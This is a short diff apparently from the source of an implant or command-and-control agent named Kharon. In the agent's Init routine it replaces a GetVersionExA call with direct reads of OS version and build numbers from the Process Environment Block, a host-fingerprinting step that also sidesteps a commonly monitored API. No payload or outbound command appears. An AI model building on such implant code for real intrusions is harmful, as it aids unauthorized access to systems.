@@ -305,9 +305,9 @@ auto DECLFN Kharon::Init(
 
     this->Krnl32.GetVersionExA( &OsVersion );
 
-    this->Machine.OsMjrV  = OsVersion.dwMajorVersion;
-    this->Machine.OsMnrV  = OsVersion.dwMinorVersion;
-    this->Machine.OsBuild = OsVersion.dwBuildNumber;
+    this->Machine.OsMjrV  = NtCurrentPeb()->OSMajorVersion;
+    this->Machine.OsMnrV  = NtCurrentPeb()->OSMinorVersion;
+    this->Machine.OsBuild = NtCurrentPeb()->OSBuildNumber;
 
     this->Ntdll.NtQueryInformationProcess( 
         NtCurrentProcess(), ProcessBasicInformation, 
